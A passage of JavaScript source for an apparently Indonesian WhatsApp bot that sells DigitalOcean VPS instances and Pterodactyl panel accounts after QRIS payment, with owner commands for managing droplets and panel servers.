await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Ditss.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Ditss.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return m.reply(example("username"))
if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!")
let us = crypto.randomBytes(2).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = text.toLowerCase() + us
const UrlQr = global.qrisOrderKuota



const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Ditss.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null})
await Ditss.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Ditss.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Ditss.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Ditss.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Ditss.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================
case "sc": case "script": case "source":
 Ditss.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 25000 * 1000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `

 👋 _*I N F O*_ 乂

> • _No Enc_
> • _Pairing_
> • _Jadibot_
> • _Fitur banyak_
> • _Fitur Keren_
 
`,
 contextInfo: {
 mentionedJid: 'p',
 externalAdReply: {
 showAdAttribution: true
 }
 }
 }
 }
 }
 }, {})
let kupppp = await Ditss.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let solsounddd = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `delever script`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:asuma;Bot;;;\nFN:Asuma Bot\nTEL;type=Mobile;waid=6285882135288:+62 858-8213-5288\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
Ditss.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //==
/*case "shop": case "shopmenu": case "menushop":
 Ditss.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 25000 * 1000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `

 👋 _*S H O P*_ 乂

> • _nokos_
> • _belisc_
> • _pulsa_
> • _transfer_
> • __
 
`,
 contextInfo: {
 mentionedJid: 'p',
 externalAdReply: {
 showAdAttribution: true
 }
 }
 }
 }
 }
 }, {})
let kupp = await Ditss.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let solsound = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `delever script`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:asuma;Bot;;;\nFN:Asuma Bot\nTEL;type=Mobile;waid=6285882135288:+62 858-8213-5288\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
//Ditss.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break*/
//===
case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Ditss.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ditss.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
